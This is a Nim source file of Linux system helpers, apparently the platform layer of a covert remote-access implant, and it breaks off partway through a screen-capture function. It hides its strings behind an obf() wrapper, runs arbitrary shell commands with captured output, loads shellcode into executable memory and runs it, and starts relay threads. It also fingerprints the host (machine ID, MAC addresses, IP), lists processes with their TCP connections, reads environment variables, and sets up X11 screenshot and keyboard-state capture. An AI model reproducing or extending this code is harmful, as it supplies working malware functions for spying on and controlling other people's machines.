import std/algorithm
import std/tables
from std/strutils import strip, splitLines, startsWith, toLowerAscii, split, parseInt, parseFloat, parseHexInt, Whitespace, rfind, find, endsWith
from posix import
  Dirent, Stat, Time, Timespec, Tm, Utsname, Uid, Pid, Pthread, Off,
  CLOCK_MONOTONIC, F_OK, O_CREAT, O_RDONLY, O_TRUNC, O_WRONLY,
  S_ISDIR, STDOUT_FILENO, STDERR_FILENO, access, chdir, clock_gettime,
  close, closedir, dup2, execvp, fork, getcwd, gethostname, getpid,
  getpwuid, getgrgid, getuid, kill, localtime_r, mkdir, nanosleep, opendir, open, pipe,
  Gid,
  pthread_cancel, pthread_create, pthread_join, pthread_self,
  read, readdir, rmdir, stat, strftime, unlink, uname, waitpid, write,
  AddrInfo, Sockaddr_in, Sockaddr_un, Timeval, InAddr, TSa_Family, Suseconds,
  getaddrinfo, freeAddrInfo, htons
export Pthread, AddrInfo, getaddrinfo, freeAddrInfo, Sockaddr_in, Sockaddr_un, TSa_Family, InAddr
import ../global
import utils

proc readlink(path: cstring, buf: pointer, bufsiz: int): int {.importc, header: "unistd.h".}
proc sysconf(name: cint): clong {.importc, header: "unistd.h".}
proc rename(oldp, newp: cstring): cint {.importc, header: "<stdio.h>".}
proc getenv(name: cstring): cstring {.importc, header: "<stdlib.h>".}
proc errnoLocation(): ptr cint {.importc: "__errno_location", header: "<errno.h>".}

proc getErrno*(): cint =
  # Returns the current errno value
  errnoLocation()[]

proc ioErrorMessage*(code: cint): string =
  # Returns a message for an io error code
  case code
  of enoEnt:
    obf("File does not exist")
  of enoAcc, enoPerm:
    obf("Access denied")
  of enoBusy:
    obf("File is in use by another process")
  of enoExist:
    obf("File already exists")
  of enoNameTooLong:
    obf("Path too long")
  of enoIo:
    obf("I/O device error")
  of enoNotEmpty:
    obf("Directory not empty")
  of enoFileTooBig:
    obf("File too large")
  else:
    obf("Cannot read file (code=") & $code & obf(")")

# ======================
# time / sleep
# ======================

proc getCurrentProcessId*(): culong =
  # Returns the current process id
  culong(getpid())

proc getTickCount*(): culong =
  # Returns the monotonic tick count in milliseconds
  var ts: Timespec
  if clock_gettime(CLOCK_MONOTONIC, ts) != 0:
    return 0
  culong(ts.tv_sec.uint64 * 1000 + ts.tv_nsec.uint64 div 1_000_000)

proc sleepMs*(ms: culong) =
  # Sleeps for the given number of milliseconds
  if ms == 0:
    return
  var req: Timespec
  req.tv_sec = Time((ms div 1000).int64)
  req.tv_nsec = (ms mod 1000).int64 * 1_000_000
  var rem: Timespec
  discard nanosleep(req, rem)

# ======================
# process exec
# ======================

proc execPosix*(cmd, args: string; buf: var openArray[char]): int =
  # Runs a shell command and writes its output into the buffer
  var script = cmd
  if args.len > 0:
    script.add ' '
    script.add args
  let shPath = obf("/bin/sh")
  let dashC = obf("-c")
  var fds: array[2, cint]
  if pipe(fds) != 0:
    return -1
  let pid = fork()
  if pid < 0:
    discard close(fds[0])
    discard close(fds[1])
    return -1
  if pid == 0:
    discard close(fds[0])
    if dup2(fds[1], STDOUT_FILENO) < 0: quit(1)
    if dup2(fds[1], STDERR_FILENO) < 0: quit(1)
    discard close(fds[1])
    var argv: array[4, cstring]
    argv[0] = shPath.cstring
    argv[1] = dashC.cstring
    argv[2] = script.cstring
    argv[3] = nil
    discard execvp(argv[0], cast[cstringArray](addr argv[0]))
    quit(127)
  discard close(fds[1])
  var total = 0
  while total < buf.len:
    let n = read(fds[0], addr buf[total], buf.len - total)
    if n <= 0:
      break
    total += n
  discard close(fds[0])
  var status: cint = 0
  discard waitpid(pid, status, 0)
  total

# ======================
# memory
# ======================

const
  memProtRead* = 1
  memProtWrite* = 2
  memProtExec* = 4
  memMapPrivate* = 0x02
  memMapAnonymous* = 0x20

proc mmap*(start: pointer; length: csize_t; prot, flags: cint; fd: cint; offset: Off): pointer {.importc, header: "sys/mman.h".}
proc munmap*(start: pointer; length: csize_t): cint {.importc, header: "sys/mman.h".}
proc mprotect*(start: pointer; len: csize_t; prot: cint): cint {.importc, header: "sys/mman.h".}

proc mapFailed*(p: pointer): bool =
  # Checks that a mapped pointer failed
  p == nil or cast[int](p) == -1

proc mapShellcodeMem*(payload: openArray[byte]): pointer =
  # Maps shellcode bytes into executable memory
  let size = payload.len.csize_t
  let mem = mmap(nil, size, memProtRead or memProtWrite, memMapPrivate or memMapAnonymous, -1, 0)
  if mapFailed(mem):
    return nil
  copyMem(mem, unsafeAddr payload[0], payload.len)
  if mprotect(mem, size, memProtRead or memProtExec) != 0:
    discard munmap(mem, size)
    return nil
  mem

proc unmapShellcodeMem*(mem: pointer; size: csize_t) =
  # Unmaps previously mapped shellcode memory
  discard munmap(mem, size)

proc forkShellcodeAndWait*(entry: pointer): bool =
  # Forks a child, runs the shellcode, and waits for it
  let pid = fork()
  if pid < 0:
    return false
  if pid == 0:
    cast[proc() {.nimcall.}](entry)()
    quit(0)
  var status: cint = 0
  discard waitpid(pid, status, 0)
  true

# ======================
# threads
# ======================

proc spawnPthread*(tid: var Pthread; fn: proc(param: pointer): pointer {.noconv.}; param: pointer): bool =
  # Starts a pthread and returns whether creation succeeded
  pthread_create(addr tid, nil, fn, param) == 0

proc joinPthread*(tid: Pthread) =
  # Waits until a pthread finishes
  discard pthread_join(tid, nil)

proc currentPthread*(): Pthread =
  # Returns the current pthread handle
  pthread_self()

proc spawnRelayWorker*(fn: proc(param: pointer): pointer {.noconv.}; param: pointer): pointer =
  # Starts a relay worker thread and returns its handle
  var tid: Pthread
  if spawnPthread(tid, fn, param):
    return cast[pointer](tid)
  nil

proc cancelPthread*(tid: Pthread) =
  # Cancels a running pthread
  discard pthread_cancel(tid)

# ======================
# sockets / network
# ======================

const
  socketInvalidFd* = cint(-1)
  socketInvalidHandle* = cast[pointer](nil)
  # Linux socket constants (posix imports fail at compile time when cross-compiling)
  afInet* = cint(2)
  afUnix* = cint(1)
  sockStream* = cint(1)
  sockDgram* = cint(2)
  ipprotoTcp* = cint(6)
  ipprotoUdp* = cint(17)
  inetAddrStrlen* = 16
  solSocket* = cint(1)
  soReuseaddr* = cint(2)
  soRcvtimeo* = cint(20)

proc osSocket*(domain, typ, protocol: cint): cint {.importc: "socket", header: "sys/socket.h".}
proc osBind*(s: cint, sockAddr: pointer; addrlen: cuint): cint {.importc: "bind", header: "sys/socket.h".}
proc osListen*(s: cint, backlog: cint): cint {.importc: "listen", header: "sys/socket.h".}
proc osAccept*(s: cint, sockAddr: pointer; addrlen: pointer): cint {.importc: "accept", header: "sys/socket.h".}
proc osConnect*(s: cint, sockAddr: pointer; addrlen: cuint): cint {.importc: "connect", header: "sys/socket.h".}
proc osSend*(s: cint; buf: pointer; len: csize_t; flags: cint): csize_t {.importc: "send", header: "sys/socket.h".}
proc osRecv*(s: cint; buf: pointer; len: csize_t; flags: cint): csize_t {.importc: "recv", header: "sys/socket.h".}
proc osSetsockopt*(s: cint; level, optname: cint; optval: pointer; optlen: cuint): cint {.importc: "setsockopt", header: "sys/socket.h".}
proc osHtons*(hostshort: uint16): uint16 =
  # Converts a host short into network byte order
  htons(hostshort)
proc osGetsockname*(s: cint; sockaddr: pointer; addrlen: pointer): cint {.importc: "getsockname", header: "sys/socket.h".}
proc inetNtop*(af: cint; src: pointer; dst: cstring; size: cuint): cstring {.importc: "inet_ntop", header: "arpa/inet.h".}
proc ioctl(fd: cint; request: culong; argp: pointer): cint {.importc, header: "sys/ioctl.h".}

const sioCGifaddr = culong(0x8915)

type Ifreq = object
  ifrName: array[16, cchar]
  ifrAddr: Sockaddr_in

proc closeFd*(fd: cint) =
  # Closes a file descriptor when it is valid
  if fd >= 0:
    discard close(fd)

proc osUnlinkPath*(path: cstring): cint =
  # Removes a filesystem path
  unlink(path)

proc fdFromHandle*(h: pointer): cint =
  # Converts a socket handle into a file descriptor
  if h == nil or h == socketInvalidHandle:
    return socketInvalidFd
  cint(cast[int](h))

proc fillUnixSockAddr*(path: string): Sockaddr_un =
  # Fills a unix socket address from a path
  result.sun_family = TSa_Family(afUnix)
  let maxPath = result.sun_path.high
  let n = min(path.len, maxPath)
  if n > 0:
    copyMem(addr result.sun_path[0], unsafeAddr path[0], n)
  if n <= maxPath:
    result.sun_path[n] = '\0'

proc setSockRecvTimeout*(fd: cint; timeoutMs: int) =
  # Sets the receive timeout on a socket
  if timeoutMs <= 0:
    return
  var tv: Timeval
  tv.tv_sec = Time(timeoutMs div 1000)
  tv.tv_usec = Suseconds((timeoutMs mod 1000) * 1000)
  discard osSetsockopt(fd, solSocket, soRcvtimeo, addr tv, cuint(sizeof(tv)))

const
  oNonblock* = 2048
  fGetfl* = 3
  fSetfl* = 4
  soError* = 4
  einprogress* = 115
  pollOut* = int16(4)

type Pollfd* = object
  fd*: cint
  events*: int16
  revents*: int16

proc osFcntl*(fd: cint; cmd: cint; arg: cint): cint {.importc: "fcntl", header: "fcntl.h".}
proc pollSyscall(fds: pointer; nfds: culong; timeout: cint): cint {.importc: "poll", header: "poll.h".}
proc osPoll*(fds: ptr Pollfd; nfds: culong; timeout: cint): cint =
  # Polls file descriptors for the given timeout
  pollSyscall(cast[pointer](fds), nfds, timeout)
proc osGetsockopt*(s: cint; level, optname: cint; optval: pointer; optlen: ptr cuint): cint {.importc: "getsockopt", header: "sys/socket.h".}
proc osSendto*(s: cint; buf: pointer; len: csize_t; flags: cint; dest: pointer; addrlen: cuint): csize_t {.importc: "sendto", header: "sys/socket.h".}

# ======================
# file io
# ======================

proc readTextRaw*(path: cstring; maxLen = readTextMax): string =
  # Reads text from a path and strips surrounding space
  let fd = open(path, O_RDONLY)
  if fd < 0:
    return ""
  defer:
    discard close(fd)
  result = newString(maxLen)
  let n = read(fd, addr result[0], maxLen)
  if n <= 0:
    return ""
  result.setLen(n)
  result = result.strip()

proc readPathToBuf*(path: string; buf: var openArray[char]): int =
  # Reads a file path into the given buffer
  let fd = open(path.cstring, O_RDONLY)
  if fd < 0:
    return -1
  defer:
    discard close(fd)
  var total = 0
  while total < buf.len:
    let n = read(fd, addr buf[total], buf.len - total)
    if n <= 0:
      break
    total += n
  total

proc pathExists*(path: string): bool =
  # Checks that a path exists
  access(path.cstring, F_OK) == 0

proc pathStat*(path: string; st: var Stat): bool =
  # Reads status data for a path
  stat(path.cstring, st) == 0

proc pathIsDir*(path: string): bool =
  # Checks that a path is a directory
  var st: Stat
  if not pathStat(path, st):
    return false
  S_ISDIR(st.st_mode)

proc readFileBytes*(path: string): tuple[ok: bool, data: seq[byte], error: string] =
  # Reads a file into a byte sequence
  var st: Stat
  if not pathStat(path, st):
    return (false, @[], ioErrorMessage(getErrno()))
  if S_ISDIR(st.st_mode):
    return (false, @[], obf("Path is a directory"))
  let total = st.st_size.int
  if total <= 0:
    return (true, @[], "")
  const fileMaxSize = 25'u64 * 1024 * 1024
  if uint64(total) > fileMaxSize:
    return (false, @[], obf("File exceeds the 25 MB limit"))
  const tasksBufferMax = 32'u64 * 1024 * 1024
  if uint64(total) > (tasksBufferMax - 4096'u64) * 3 div 4:
    return (false, @[], obf("Output too large"))
  let fd = open(path.cstring, O_RDONLY)
  if fd < 0:
    return (false, @[], ioErrorMessage(getErrno()))
  defer:
    discard close(fd)
  var data = newSeq[byte](total)
  var offset = 0
  while offset < total:
    let chunk = min(total - offset, readChunk)
    let n = read(fd, addr data[offset], chunk)
    if n < 0:
      return (false, @[], ioErrorMessage(getErrno()))
    if n == 0:
      data.setLen(offset)
      return (true, data, "")
    offset += n
  (true, data, "")

proc joinPath*(base, name: string): string =
  # Joins a base path and a name
  if base.len == 0:
    name
  elif base == pathSep:
    pathSep & name
  elif base[^1] == '/':
    base & name
  else:
    base & pathSep & name

proc formatPathDate*(path: string): string =
  # Formats the modification date of a path
  var st: Stat
  if not pathStat(path, st):
    return obf("unknown")
  var tm: Tm
  if localtime_r(st.st_mtim.tv_sec, tm) == nil:
    return obf("unknown")
  var buf: array[16, char]
  let n = strftime(cast[cstring](addr buf[0]), buf.len, dateFmt, tm)
  if n == 0:
    return obf("unknown")
  $cast[cstring](addr buf[0])

proc getPathSize*(path: string): int64 =
  # Returns the size of a path in bytes
  var st: Stat
  if not pathStat(path, st):
    return -1
  st.st_size.int64

proc getPathModeStr*(path: string): string =
  # Returns the permission digits of a path
  var st: Stat
  if not pathStat(path, st):
    return ""
  let mode = st.st_mode and 0o777
  var digits: array[4, char]
  digits[0] = '0'
  digits[1] = char(ord('0') + int((mode shr 6) and 7))
  digits[2] = char(ord('0') + int((mode shr 3) and 7))
  digits[3] = char(ord('0') + int(mode and 7))
  $cast[cstring](addr digits[0])

proc formatPathMtime*(path: string): string =
  # Formats the modification time of a path
  var st: Stat
  if not pathStat(path, st):
    return obf("-")
  var tm: Tm
  if localtime_r(st.st_mtim.tv_sec, tm) == nil:
    return obf("-")
  var buf: array[32, char]
  let n = strftime(cast[cstring](addr buf[0]), buf.len, mtimeFmt, tm)
  if n == 0:
    return obf("-")
  $cast[cstring](addr buf[0])

# ======================
# directories
# ======================

proc getCurrentDir*(): string =
  # Returns the current working directory
  var buf: array[pathMax, char]
  if getcwd(cast[cstring](addr buf[0]), buf.len) == nil:
    return ""
  ($cast[cstring](addr buf[0])).strip()

proc setCurrentDir*(path: string): bool =
  # Changes the current working directory
  chdir(path.cstring) == 0

proc makeDir*(path: string): bool =
  # Creates a directory
  mkdir(path.cstring, dirMode) == 0

proc removeDirPath*(path: string): bool =
  # Removes an empty directory
  rmdir(path.cstring) == 0

proc deletePath*(path: string): bool =
  # Deletes a file path
  unlink(path.cstring) == 0

proc movePath*(src, dst: string): bool =
  # Moves a path to a new location
  rename(src.cstring, dst.cstring) == 0

proc copyPath*(src, dst: string): bool =
  # Copies a file from the source path to the destination
  let fdIn = open(src.cstring, O_RDONLY)
  if fdIn < 0:
    return false
  var ok = false
  block copy:
    let fdOut = open(dst.cstring, O_WRONLY or O_CREAT or O_TRUNC, fileMode)
    if fdOut < 0:
      break copy
    block inner:
      defer:
        discard close(fdOut)
      var chunk: array[readChunk, byte]
      while true:
        let n = read(fdIn, addr chunk[0], chunk.len)
        if n < 0:
          return false
        if n == 0:
          ok = true
          break inner
        var off = 0
        while off < n:
          let w = write(fdOut, addr chunk[off], n - off)
          if w <= 0:
            return false
          off += w
  discard close(fdIn)
  ok

type DirEntry* = object
  name*: string
  isDir*: bool

proc listDirEntries*(dir: string): seq[DirEntry] =
  # Lists the entries inside a directory
  result = @[]
  let handle = opendir(dir.cstring)
  if handle == nil:
    return
  defer:
    discard closedir(handle)
  while true:
    let ent = readdir(handle)
    if ent == nil:
      break
    let name = ($cast[cstring](addr ent.d_name[0])).strip()
    if name.len == 0 or name == dotName or name == dotDotName:
      continue
    var full = dir
    if full.len > 0 and full[^1] != '/':
      full.add '/'
    full.add name
    var st: Stat
    let isDir = pathStat(full, st) and S_ISDIR(st.st_mode)
    result.add DirEntry(name: name, isDir: isDir)

proc countDirEntries*(path: string): int =
  # Counts the entries inside a directory
  if not pathIsDir(path):
    return 0
  listDirEntries(path).len

# ======================
# env
# ======================

proc envGetValue*(key: string): string =
  # Returns the value of an environment variable
  let val = getenv(key.cstring)
  if val == nil:
    return ""
  $val

proc envEnumerate*(): seq[(string, string)] =
  # Lists environment variables as key and value pairs
  result = @[]
  let raw = readTextRaw(procEnvironPath.cstring, environMax)
  for item in raw.split('\0'):
    if item.len == 0:
      continue
    let eq = item.find('=')
    if eq > 0:
      result.add (item[0 ..< eq], item[eq + 1 .. ^1])

# ======================
# fingerprint
# ======================

proc readHostname*(): string =
  # Reads the machine hostname
  var buf: array[256, cchar]
  if gethostname(cast[cstring](addr buf[0]), buf.len) == 0:
    result = ($cast[cstring](addr buf[0])).strip()
  else:
    result = ""

proc getCurrentUser*(): string =
  # Returns the current user name
  let entry = getpwuid(getuid())
  if entry != nil and entry.pw_name != nil:
    result = $entry.pw_name
  else:
    result = envGetValue(userEnvKey)

proc getOsName*(): string =
  # Returns the operating system name
  let release = readTextRaw(osReleasePath.cstring)
  for line in release.splitLines():
    if line.startsWith(osPrettyPrefix):
      result = line[osPrettyPrefix.len .. ^1].strip(chars = {'"', '\''})
      return
  var un: Utsname
  if uname(un) == 0:
    result = $cast[cstring](un.release[0].addr)
  else:
    result = ""

proc getMachineArch*(): string =
  # Returns the machine architecture
  var un: Utsname
  if uname(un) != 0:
    result = obf("unknown")
  else:
    let machine = $cast[cstring](un.machine[0].addr)
    if machine == archX64:
      result = obf("x64")
    elif machine == archArm64:
      result = obf("arm64")
    else:
      result = machine

proc getMachineId*(): string =
  # Reads the machine id
  readTextRaw(machineIdPath.cstring)

proc collectMacAddresses*(): seq[string] =
  # Collects mac addresses from network interfaces
  result = @[]
  for ent in listDirEntries(netClassRoot):
    if ent.name == loopbackName:
      continue
    let mac = readTextRaw((netClassRoot & pathSep & ent.name & netAddressSuffix).cstring).toLowerAscii()
    if mac.len > 0 and mac != nullMac:
      result.add(mac)
  sort(result)

proc getInternalIp*(): string =
  # Returns an internal ip address
  result = ""
  for ent in listDirEntries(netClassRoot):
    if ent.name == loopbackName:
      continue
    var ifr: Ifreq
    zeroMem(addr ifr, sizeof(ifr))
    let ifaceName = ent.name
    if ifaceName.len == 0 or ifaceName.len >= ifr.ifrName.len:
      continue
    for i in 0 ..< ifaceName.len:
      ifr.ifrName[i] = ifaceName[i].cchar
    let s = osSocket(afInet, sockDgram, 0)
    if s == socketInvalidFd:
      return
    defer:
      closeFd(s)
    if ioctl(s, sioCGifaddr, addr ifr) != 0:
      continue
    var buf: array[inetAddrStrlen, char]
    let ipText = inetNtop(
      afInet, addr ifr.ifrAddr.sin_addr, cast[cstring](addr buf[0]), inetAddrStrlen.cuint)
    if ipText == nil:
      continue
    let ip = ($ipText).strip()
    if ip.len > 0:
      result = ip
      return

# ======================
# process
# ======================

type ProcessStat* = object
  pid*: int
  ppid*: int
  session*: int
  utime*: int64
  stime*: int64
  comm*: string

proc readLinkPath*(path: string): string =
  # Reads the target of a symbolic link
  var buf: array[pathMax, char]
  let n = readlink(path.cstring, addr buf[0], buf.len)
  if n <= 0:
    return ""
  result = newString(n)
  copyMem(addr result[0], addr buf[0], n)

proc getClockTicks*(): int64 =
  # Returns clock ticks per second
  let v = sysconf(scClkTck.cint)
  if v <= 0: 100 else: v.int64

proc getCpuCount*(): int =
  # Returns the number of online cpus
  let v = sysconf(scNProcessorsOnln.cint)
  if v <= 0: 1 else: v.int

proc getProcUptime*(): float =
  # Reads the system uptime in seconds
  let raw = readTextRaw(procUptimePath.cstring, 128)
  if raw.len == 0:
    return 0.0
  let sp = raw.split(Whitespace)
  if sp.len == 0:
    return 0.0
  try:
    parseFloat(sp[0])
  except ValueError:
    0.0

proc listProcessIds*(): seq[int] =
  # Lists numeric process ids from proc
  result = @[]
  for ent in listDirEntries(procRoot):
    if ent.name.len == 0:
      continue
    var ok = true
    for ch in ent.name:
      if ch notin {'0'..'9'}:
        ok = false
        break
    if not ok:
      continue
    try:
      result.add parseInt(ent.name)
    except ValueError:
      discard
  sort(result)

proc readProcessStat*(pid: int): ProcessStat =
  # Reads stat fields for a process
  let raw = readTextRaw((procRoot & pathSep & $pid & procStatSuffix).cstring, readTextMax)
  let rp = raw.rfind(')')
  if rp < 0 or raw.find('(') < 0:
    return ProcessStat()
  result.pid = pid
  result.comm = raw[raw.find('(') + 1 ..< rp]
  let fields = raw[rp + 2 .. ^1].split(Whitespace)
  if fields.len < 22:
    return ProcessStat()
  try:
    result.ppid = parseInt(fields[1])
    result.session = parseInt(fields[3])
    result.utime = parseInt(fields[11]).int64
    result.stime = parseInt(fields[12]).int64
  except ValueError:
    discard

proc readProcessStatus*(pid: int): tuple[name: string, uid: int, vmRssKb: int64] =
  # Reads status fields for a process
  result = ("", 0, 0'i64)
  let raw = readTextRaw((procRoot & pathSep & $pid & procStatusSuffix).cstring, readTextMax)
  for line in raw.splitLines():
    if line.startsWith(obf("Name:")):
      let tab = line.find('\t')
      if tab >= 0:
        result.name = line[tab + 1 .. ^1].strip()
    elif line.startsWith(obf("Uid:")):
      let tab = line.find('\t')
      if tab >= 0:
        try:
          result.uid = parseInt(line[tab + 1 .. ^1].split(Whitespace)[0])
        except ValueError:
          discard
    elif line.startsWith(obf("VmRSS:")):
      let parts = line.split(Whitespace)
      for part in parts:
        if part.len > 0 and part[0] in {'0'..'9'}:
          try:
            result.vmRssKb = parseInt(part).int64
          except ValueError:
            discard
          break

proc readProcessExePath*(pid: int): string =
  # Reads the executable path of a process
  readLinkPath(procRoot & pathSep & $pid & procExeSuffix)

proc formatProcessUser*(uid: int): string =
  # Returns the user name for a uid
  let entry = getpwuid(Uid(uid))
  if entry != nil and entry.pw_name != nil:
    $entry.pw_name
  else:
    $uid

proc formatProcessGroup*(gid: int): string =
  # Returns the group name for a gid
  let entry = getgrgid(Gid(gid))
  if entry != nil and entry.gr_name != nil:
    $entry.gr_name
  else:
    $gid

proc formatProcessPrivilege*(uid: int): tuple[integrity, privilege: string] =
  # Returns privilege labels for a uid
  if uid == 0:
    (obf("root"), obf("root"))
  else:
    (obf("user"), obf("user"))

proc formatProcessArch*(): string =
  # Returns the architecture label for the current machine
  case getMachineArch()
  of obf("x64"), obf("arm64"):
    obf("64-bit")
  else:
    getMachineArch()

proc parseTcpHexAddr*(addrPort: string): string =
  # Parses a hex tcp address into text
  let parts = addrPort.split(':')
  if parts.len != 2 or parts[0].len != 8:
    return ""
  if parts[0] == obf("00000000"):
    return ""
  try:
    let port = parseHexInt(parts[1])
    var ip = ""
    for i in countdown(3, 0):
      let byte = parseHexInt(parts[0][i * 2 .. i * 2 + 1])
      if ip.len > 0:
        ip.add '.'
      ip.add $byte
    ip & obf(":") & $port
  except ValueError:
    ""

proc getTcpInodeRemotes*(): Table[int, string] =
  # Maps tcp inodes to remote addresses
  result = initTable[int, string]()
  let raw = readTextRaw(procNetTcpPath.cstring, readTextMax)
  for line in raw.splitLines():
    if line.len == 0 or line[0] != ' ':
      continue
    let fields = line.split(Whitespace)
    if fields.len < 10:
      continue
    if fields[3] != obf("01"):
      continue
    let remote = parseTcpHexAddr(fields[2])
    if remote.len == 0:
      continue
    try:
      let inode = parseInt(fields[^1])
      if not result.hasKey(inode):
        result[inode] = remote
    except ValueError:
      discard

proc getTcpPidMap*(): Table[int, string] =
  # Maps process ids to their tcp remote addresses
  let inodes = getTcpInodeRemotes()
  result = initTable[int, string]()
  for pid in listProcessIds():
    let fdDir = procRoot & pathSep & $pid & procFdSuffix
    for ent in listDirEntries(fdDir):
      let target = readLinkPath(fdDir & pathSep & ent.name)
      if not target.startsWith(socketPrefix) or not target.endsWith("]"):
        continue
      let inodeText = target[socketPrefix.len .. ^2]
      try:
        let inode = parseInt(inodeText)
        if inodes.hasKey(inode) and not result.hasKey(pid):
          result[pid] = inodes[inode]
      except ValueError:
        discard

# ======================
# x11 / screenshot
# ======================

{.passl: "-ldl".}

const
  xZPixmap = 2
  xAllPlanes = culong(0xFFFFFFFF)
  xRtldLazy = 1

type Display = distinct pointer
type Window = culong

type XImage = object
  width, height: cint
  xoffset, format: cint
  data: pointer
  byte_order: cint
  bitmap_unit: cint
  bitmap_bit_order: cint
  bitmap_pad: cint
  depth: cint
  bytes_per_line: cint
  bits_per_pixel: cint
  red_mask: culong
  green_mask: culong
  blue_mask: culong

type XOpenDisplayFn = proc(display_name: cstring): Display {.cdecl.}
type XCloseDisplayFn = proc(display: Display) {.cdecl.}
type XDefaultScreenFn = proc(display: Display): cint {.cdecl.}
type XDisplayWidthFn = proc(display: Display, screen: cint): cint {.cdecl.}
type XDisplayHeightFn = proc(display: Display, screen: cint): cint {.cdecl.}
type XDefaultRootWindowFn = proc(display: Display): Window {.cdecl.}
type XGetImageFn = proc(display: Display; drawable: Window; x, y: cint; width, height: cuint; plane_mask: culong; format: cint): ptr XImage {.cdecl.}
type XDestroyImageFn = proc(ximage: ptr XImage): cint {.cdecl.}
type XDisplayKeycodesFn = proc(display: Display; min_kc, max_kc: ptr cint): cint {.cdecl.}
type XQueryKeymapFn = proc(display: Display; keys: ptr array[32, char]): cint {.cdecl.}
type XKeycodeToKeysymFn = proc(display: Display; keycode: cuint; index: cint): culong {.cdecl.}

const x11ErrorCodeOffset = 32

type XErrorHandlerFn = proc(display: Display; event: pointer): cint {.cdecl.}
type XSetErrorHandlerFn = proc(handler: XErrorHandlerFn): XErrorHandlerFn {.cdecl.}

proc dlopen(name: cstring, flag: cint): pointer {.importc, header: "dlfcn.h".}
proc dlsym(handle: pointer, name: cstring): pointer {.importc, header: "dlfcn.h".}

var
  x11CaptureErrorCode: uint8 = 0
  xLibHandle: pointer = nil
  xOpenDisplayFn: XOpenDisplayFn = nil
  xCloseDisplayFn: XCloseDisplayFn = nil
  xDefaultScreenFn: XDefaultScreenFn = nil
  xDisplayWidthFn: XDisplayWidthFn = nil
  xDisplayHeightFn: XDisplayHeightFn = nil
  xDefaultRootWindowFn: XDefaultRootWindowFn = nil
  xGetImageFn: XGetImageFn = nil
  xDestroyImageFn: XDestroyImageFn = nil
  xDisplayKeycodesFn: XDisplayKeycodesFn = nil
  xQueryKeymapFn: XQueryKeymapFn = nil
  xKeycodeToKeysymFn: XKeycodeToKeysymFn = nil
  xSetErrorHandlerFn: XSetErrorHandlerFn = nil

proc x11CaptureErrorHandler(display: Display; event: pointer): cint {.cdecl.} =
  # Records x11 capture errors without aborting the process
  if event != nil:
    x11CaptureErrorCode = cast[ptr uint8](cast[int](event) + x11ErrorCodeOffset)[]
  0

proc shellCommandSucceeded(status: cint): bool =
  # Checks that a shell child exited with status zero
  (status and 0x7F) == 0 and ((status shr 8) and 0xFF) == 0

proc runShellQuiet*(script: string): bool =
  # Runs a shell command and returns whether it exited successfully
  let shPath = obf("/bin/sh")
  let dashC = obf("-c")
  let pid = fork()
  if pid < 0:
    return false
  if pid == 0:
    var argv: array[4, cstring]
    argv[0] = shPath.cstring
    argv[1] = dashC.cstring
    argv[2] = script.cstring
    argv[3] = nil
    discard execvp(argv[0], cast[cstringArray](addr argv[0]))
    quit(127)
  var status: cint = 0
  discard waitpid(pid, status, 0)
  shellCommandSucceeded(status)

proc grimBinaryPath*(): string =
  # Returns the first grim binary path that exists on disk
  for path in grimBinPaths:
    if pathExists(path):
      return path
  ""

proc sessionIsWayland*(): bool =
  # Checks that the current session type is wayland
  let raw = getenv(sessionTypeEnvKey.cstring)
  if raw == nil:
    return false
  $raw == sessionTypeWayland

proc fallbackCaptureAvailable*(): bool =
  # Checks that a non-x11 screen capture tool is available
  grimBinaryPath().len > 0 or pathExists(gnomeScreenshotBin)

proc loadX11(): bool =
  # Loads the x11 library and resolves its symbols
  if xLibHandle != nil:
    return xOpenDisplayFn != nil
  xLibHandle = dlopen(xLibSo6.cstring, xRtldLazy)
  if xLibHandle == nil:
    xLibHandle = dlopen(xLibSo.cstring, xRtldLazy)
  if xLibHandle == nil:
    return false
  xOpenDisplayFn = cast[XOpenDisplayFn](dlsym(xLibHandle, obf("XOpenDisplay").cstring))
  xCloseDisplayFn = cast[XCloseDisplayFn](dlsym(xLibHandle, obf("XCloseDisplay").cstring))
  xDefaultScreenFn = cast[XDefaultScreenFn](dlsym(xLibHandle, obf("XDefaultScreen").cstring))
  xDisplayWidthFn = cast[XDisplayWidthFn](dlsym(xLibHandle, obf("XDisplayWidth").cstring))
  xDisplayHeightFn = cast[XDisplayHeightFn](dlsym(xLibHandle, obf("XDisplayHeight").cstring))
  xDefaultRootWindowFn = cast[XDefaultRootWindowFn](dlsym(xLibHandle, obf("XDefaultRootWindow").cstring))
  xGetImageFn = cast[XGetImageFn](dlsym(xLibHandle, obf("XGetImage").cstring))
  xDestroyImageFn = cast[XDestroyImageFn](dlsym(xLibHandle, obf("XDestroyImage").cstring))
  xDisplayKeycodesFn = cast[XDisplayKeycodesFn](dlsym(xLibHandle, obf("XDisplayKeycodes").cstring))
  xQueryKeymapFn = cast[XQueryKeymapFn](dlsym(xLibHandle, obf("XQueryKeymap").cstring))
  xKeycodeToKeysymFn = cast[XKeycodeToKeysymFn](dlsym(xLibHandle, obf("XKeycodeToKeysym").cstring))
  xSetErrorHandlerFn = cast[XSetErrorHandlerFn](dlsym(xLibHandle, obf("XSetErrorHandler").cstring))
  if xSetErrorHandlerFn != nil:
    discard xSetErrorHandlerFn(x11CaptureErrorHandler)
  xOpenDisplayFn != nil and xCloseDisplayFn != nil and xDefaultScreenFn != nil and
    xDisplayWidthFn != nil and xDisplayHeightFn != nil and xDefaultRootWindowFn != nil and
    xGetImageFn != nil and xDestroyImageFn != nil and xDisplayKeycodesFn != nil and
    xQueryKeymapFn != nil and xKeycodeToKeysymFn != nil

proc maskShift(mask: culong): cint =
  # Returns how many bits a color mask is shifted
  if mask == 0:
    return 0
  var m = mask
  var s: cint = 0
  while (m and culong(1)) == 0:
    m = m shr 1
    inc s
  s

proc readXPixel(img: ptr XImage; x, y: int): culong =
  # Reads one pixel value from an x image
  let line = y * img.bytes_per_line.int
  let col = x * img.bits_per_pixel.int div 8
  let base = cast[int](img.data) + line + col
  case img.bits_per_pixel
  of 32:
    cast[ptr culong](base)[]
  of 24:
    let p = cast[ptr UncheckedArray[byte]](base)
    culong(p[0]) or (culong(p[1]) shl 8) or (culong(p[2]) shl 16)
  of 16:
    culong(cast[ptr uint16](base)[])
  else:
    culong(0)

type ScreenCapture* = object
  ok*: bool
  error*: string
  data*: seq[byte]
  w*, h*, stride*: int
  png*: seq[byte]

proc pretestCapture*(): string =
  # Checks that a screen capture can start
  if getenv(displayEnvKey.cstring) != nil:
    if loadX11():
      let disp = xOpenDisplayFn(nil)
      if cast[pointer](disp) != nil:
        defer:
          xCloseDisplayFn(disp)
        let screen = xDefaultScreenFn(disp)
        let w = xDisplayWidthFn(disp, screen)
        let h = xDisplayHeightFn(disp, screen)
